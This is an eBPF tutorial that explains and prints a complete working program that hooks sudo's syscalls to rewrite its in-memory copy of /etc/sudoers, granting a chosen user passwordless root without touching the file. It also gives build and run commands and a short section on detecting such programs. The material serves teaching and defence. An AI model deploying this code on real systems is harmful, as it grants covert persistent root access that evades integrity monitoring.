# eBPF Tutorial: Privilege Escalation via File Content Manipulation

eBPF's power extends far beyond simple tracing—it can modify data flowing through the kernel in real-time. While this capability enables innovative solutions for performance optimization and security monitoring, it also opens doors to sophisticated attack vectors that traditional security tools might miss. This tutorial demonstrates one such technique: using eBPF to grant unprivileged users root access by manipulating what `sudo` sees when reading `/etc/sudoers`.

This example reveals how attackers could abuse eBPF's `bpf_probe_write_user` helper to bypass Linux's permission model entirely, without leaving traces in log files or modifying actual system files. Understanding these attack patterns is crucial for defenders building eBPF-aware security monitoring.

> The complete source code: <https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/26-sudo>

## The Attack Vector: Intercepting File Reads

Traditional privilege escalation attacks modify `/etc/sudoers` directly, leaving obvious traces in file timestamps, audit logs, and integrity monitoring systems. This eBPF-based approach is far more subtle—it intercepts `sudo`'s read operation and replaces the file content in memory before `sudo` processes it. The actual file on disk remains unchanged, defeating most file integrity monitors.

The attack works by exploiting a critical window: when `sudo` reads `/etc/sudoers` into a buffer, the data briefly exists in userspace memory. eBPF programs can access and modify this userspace memory using `bpf_probe_write_user`, effectively lying to `sudo` about what permissions exist without ever touching the real file.

Here's the attack flow: when any process opens `/etc/sudoers`, we record its file descriptor. When that same process reads from the file, we capture the buffer address. After the read completes, we overwrite the first line with `<username> ALL=(ALL:ALL) NOPASSWD:ALL #`, making `sudo` believe the target user has full root privileges. The trailing `#` comments out whatever was originally on that line, preventing parse errors.

## Implementation: Hooking the System Call Path

Let's examine how this attack is implemented in eBPF. The complete kernel-side code coordinates four system call hooks to track file operations and inject malicious content.

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

// These store the string we're going to
// add to /etc/sudoers when viewed by sudo
// Which makes it think our user can sudo
// without a password
const volatile int payload_len = 0;
const volatile char payload[max_payload_len];

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // Check comm is sudo
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const int sudo_len = 5;
    const char *sudo = "sudo";
    for (int i = 0; i < sudo_len; i++) {
        if (comm[i] != sudo[i]) {
            return 0;
        }
    }

    // Now check we're opening sudoers
    const char *sudoers = "/etc/sudoers";
    char filename[sudoers_len];
    bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
    for (int i = 0; i < sudoers_len; i++) {
        if (filename[i] != sudoers[i]) {
            return 0;
        }
    }
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;

    // Add our payload to the first line
    if (read_size < payload_len) {
        return 0;
    }

    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This sorta corrupts the sudoers file, but everything still
    // works as expected
    char local_buff[max_payload_len] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) {
            local_buff[i] = '#';
        }
        else {
            local_buff[i] = payload[i];
        }
    }
    // Write data back to buffer
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}
```

The program uses a multi-stage approach. First, `handle_openat_enter` acts as a filter—it checks that the process is `sudo`, that it's opening `/etc/sudoers`, and optionally that it matches a specific UID or parent PID. This filtering is critical because we don't want to affect every file operation on the system, only the specific case where `sudo` reads its configuration.

When `sudo` opens `/etc/sudoers`, the kernel returns a file descriptor. We catch this in `handle_openat_exit` and store the file descriptor in `map_fds`. This map links the process (identified by `pid_tgid`) to its sudoers file descriptor, so we know which reads to intercept.

The next hook, `handle_read_enter`, triggers when `sudo` calls `read()` on that file descriptor. The crucial detail here is capturing the buffer address—that's where the kernel will copy the file contents, and that's what we'll overwrite. We store this address in `map_buff_addrs`.

The attack executes in `handle_read_exit`. After the kernel completes the read operation and fills the buffer with the real sudoers content, we use `bpf_probe_write_user` to overwrite it. We replace the first line with our payload (`<username> ALL=(ALL:ALL) NOPASSWD:ALL #`) and fill the rest of the buffer with `#` characters to comment out the original content. From `sudo`'s perspective, it read a legitimate sudoers file that grants our user full privileges.

Finally, `handle_close_exit` cleans up our tracking maps when `sudo` closes the file, preventing memory leaks.

## Userspace Loader and Configuration

The userspace component is straightforward—it configures the attack parameters and loads the eBPF program. The critical part is setting up the payload string that will be injected into `sudo`'s memory. This string is stored in the eBPF program's read-only data section, making it visible to the kernel at verification time but modifiable before loading.

The loader accepts command-line arguments to specify the username to grant privileges, optionally restrict the attack to a specific user or process tree, and then loads the eBPF program with these parameters baked into the bytecode. When `sudo` next runs, the attack executes automatically without any further userspace interaction needed.

## Security Implications and Detection

This attack demonstrates why eBPF requires `CAP_BPF` or `CAP_SYS_ADMIN` capabilities—these programs can fundamentally alter system behavior. An attacker who gains root access even briefly could load this eBPF program and maintain persistent access even after their initial foothold is removed.

Detection is challenging. The file on disk remains unchanged, so traditional file integrity monitoring fails. The attack happens entirely in kernel space during normal system call execution, leaving no unusual process behavior. However, defenders can look for loaded eBPF programs with write capabilities (`bpftool prog list`), monitor for `bpf()` system calls, or use eBPF-aware security tools that can inspect loaded programs.

Modern security platforms like Falco and Tetragon can detect suspicious eBPF activity by monitoring program loading and examining attached hooks. The key is maintaining visibility into the eBPF subsystem itself.

## Compilation and Execution

Compile the program by running make in the tutorial directory:

```bash
cd src/26-sudo
make
```

To test the attack (in a safe VM environment), run as root and specify a target username:

```bash
sudo ./sudoadd --username lowpriv-user
```

This will intercept `sudo` operations and grant `lowpriv-user` root access without modifying `/etc/sudoers`. When `lowpriv-user` runs `sudo`, they'll be able to execute commands as root without entering a password. Other programs reading `/etc/sudoers` (like `cat` or text editors) will still see the original, unmodified file.

The `--restrict` flag limits the attack to only work when executed by the specified user, and `--target-ppid` can scope the attack to a specific process tree.

## Summary

This tutorial showed how eBPF's memory manipulation capabilities can subvert Linux's security model by intercepting and modifying data flowing through the kernel. While powerful for legitimate debugging and monitoring, these same features enable sophisticated attacks that bypass traditional security controls. The key takeaway for defenders is that eBPF programs themselves must be treated as a critical part of your attack surface—monitoring what eBPF programs are loaded and what capabilities they use is essential for modern Linux security.

> If you'd like to dive deeper into eBPF, check out our tutorial repository at <https://github.com/eunomia-bpf/bpf-developer-tutorial> or visit our website at <https://eunomia.dev/tutorials/>.

## References

- Original bad-bpf project: <https://github.com/pathtofile/bad-bpf>
- eBPF helpers documentation: <https://man7.org/linux/man-pages/man7/bpf-helpers.7.html>
